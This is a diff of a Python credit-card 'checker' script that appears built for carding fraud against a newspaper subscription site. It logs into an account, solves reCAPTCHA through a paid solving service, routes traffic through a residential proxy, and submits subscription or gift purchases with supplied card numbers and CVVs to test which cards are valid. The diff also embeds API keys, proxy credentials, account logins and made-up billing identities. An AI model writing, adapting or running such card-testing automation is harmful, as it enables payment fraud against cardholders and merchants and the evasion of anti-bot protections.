@@ -21,7 +21,7 @@ def pegarItem(data, esquerda, direita):
 
 def criarTask():
     data = {
-        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
+        "clientKey": "409154ed879c9e41c25703a6f92289bd",
         "task": {
             "type": "RecaptchaV2TaskProxyless",
             "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
@@ -33,7 +33,7 @@ def criarTask():
     )
     taskId = criar.json()["taskId"]
     while True:
-        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
+        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
         resultado = requests.post(
             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
         )
@@ -96,7 +96,7 @@ def retesteSaldo(card, month, year, cvv):
         
 def Saldo():
     data = {
-        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
+        "clientKey": "409154ed879c9e41c25703a6f92289bd",
         "task": {
             "type": "RecaptchaV2EnterpriseTask",
             "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
@@ -108,7 +108,7 @@ def Saldo():
     )
     taskId = criar.json()["taskId"]
     while True:
-        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
+        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
         resultado = requests.post(
             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
         )
@@ -223,14 +223,21 @@ def saldo(card, month, year, cvv):
             
 def checker(card, month, year, cvv):
     try:
-        time.sleep(5)
-        p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
+        #time.sleep(5)
+        p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
         start_time = time.time() 
 
 
         url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"
 
-        payload = "&site=sound&login_id=jacaccbot%40gmail.com&password=radask10&referrer=&masterL=&masterP=null"
+        payload = {
+            'site':	'sound',
+            'login_id':	'9cu324hfvc98743@gmail.com',
+            'password':	'radask10',
+            'referrer': '',
+            'masterL':	'',
+            'masterP':	'null',
+        }
         headers = {
             'Host': 'everettweb.newzware.com',
             'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
@@ -255,7 +262,18 @@ def checker(card, month, year, cvv):
 
         url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"
 
-        payload = "login_id=jacaccbot%40gmail.com&hash=c59dbf4b7a1fef9a88f2c98d9d805cab&site=sound&encrypted=Y&nwmodule=&nwpage=&rate_id=&remember=N&reverse_remember_me=N&nwregistered="
+        payload = {
+            'login_id':	'9cu324hfvc98743@gmail.com',
+            'hash':	'a5f7964ccd6d9c98056f5ce3a39c41a3',
+            'site':	'sound',
+            'encrypted':	'Y',
+            'nwmodule':	'',
+            'nwpage':	'',
+            'rate_id':	'',
+            'remember':	'N',
+            'reverse_remember_me':	'N',
+            'nwregistered':	'',
+        }
         headers = {
         'Host': 'everettweb.newzware.com',
         'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
@@ -279,29 +297,60 @@ def checker(card, month, year, cvv):
         response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
         sessao = response.headers.get('JSESSIONID')
 
-        recap = criarTask()
-
-        url = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
-
-        payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
+        
+        
+        
+        url = "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp"
+        payload = "nwmodule=subscribers&nwpage=newstart&nwmessage="
         headers = {
-        'Host': 'everettweb.newzware.com',
-        'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
-        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-        'sec-ch-ua-mobile': '?0',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-        'sec-ch-ua-platform': '"Windows"',
-        'accept': '*/*',
-        'origin': 'https://everettweb.newzware.com',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-dest': 'empty',
-        'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?site=sound&nwmodule=subscribers&nwpage=gift&giftAccount=90411139&login_id=jacaccbot%40gmail.com&lname=PESRES',
-        'accept-language': 'pt-PT,pt;q=0.9',
-        'Content-Type': 'text/plain'
-        }
-
-        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            'Host': 'everettweb.newzware.com',
+            'Cookie': f'JSESSIONID={sessao}; _ga_N2QEL3DTVR=GS1.1.1712874273.1.1.1712874445.11.0.0; _fbp=fb.1.1712874759467.494689609; _ga_XD0GNJV3C4=GS1.2.1712874766.1.1.1712874809.17.0.0; _ga_W2SZS1YBEN=GS1.1.1712925791.1.1.1712926522.0.0.0; _ga_1KSYYTLTZT=GS1.1.1712928667.2.0.1712928697.30.0.0; prism_649272325=3e7db6db-07ce-4974-9350-da56352a1ceb; _ga_0ECZGJF1KK=GS1.2.1712929072.4.1.1712932019.0.0.0; _ga_D08DC40GS3=GS1.2.1712929071.4.1.1712932019.60.0.0; _ga=GA1.2.592130853.1712693142; _ga_K5KBE01SMW=GS1.1.1713035588.9.1.1713035635.0.0.0; nwssmcookie=ssm; nwssmapptype=S',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'upgrade-insecure-requests': '1',
+            'origin': 'https://everettweb.newzware.com',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?autoLogout=N&nwmodule=account&nwpage=dashboard',
+            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+            'priority': 'u=0, i'
+            }
+        response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+        sessao = pegarItem(response.text, "id='sessionId' value='","'")
+        
+        
+        recap = criarTask()
+        
+        url = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%2C%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=222&cc_exp_month={month}&cc_exp_year={year}&cc_holder=fd%20ffs&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31477&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=152.00&nie_amt=0&grat_amt=0&subtotal_amt=152.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"
+        payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%2C%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=222&cc_exp_month={month}&cc_exp_year={year}&cc_holder=fd%20ffs&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31477&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=152.00&nie_amt=0&grat_amt=0&subtotal_amt=152.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"
+        headers = {
+            'Host': 'everettweb.newzware.com',
+            'Cookie': 'JSESSIONID=eXucGEMcwbTIgOj9xgJ74alL1qTXF8uurtOlpVYy.everett-web; _ga_N2QEL3DTVR=GS1.1.1712874273.1.1.1712874445.11.0.0; _fbp=fb.1.1712874759467.494689609; _ga_XD0GNJV3C4=GS1.2.1712874766.1.1.1712874809.17.0.0; _ga_W2SZS1YBEN=GS1.1.1712925791.1.1.1712926522.0.0.0; _ga_1KSYYTLTZT=GS1.1.1712928667.2.0.1712928697.30.0.0; prism_649272325=3e7db6db-07ce-4974-9350-da56352a1ceb; _ga_0ECZGJF1KK=GS1.2.1712929072.4.1.1712932019.0.0.0; _ga_D08DC40GS3=GS1.2.1712929071.4.1.1712932019.60.0.0; _ga=GA1.2.592130853.1712693142; _ga_K5KBE01SMW=GS1.1.1713035588.9.1.1713035635.0.0.0; nwssmcookie=ssm; nwssmapptype=S',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'sec-ch-ua-platform': '"Windows"',
+            'accept': '*/*',
+            'origin': 'https://everettweb.newzware.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
+            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+            'priority': 'u=1, i',
+            'Content-Type': 'text/plain'
+            }
+        response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+        
+        
+        
         time.sleep(4)
 
         elapsed_time = time.time() - start_time
@@ -431,4 +480,3 @@ if __name__ == '__main__':
     
     
     
-
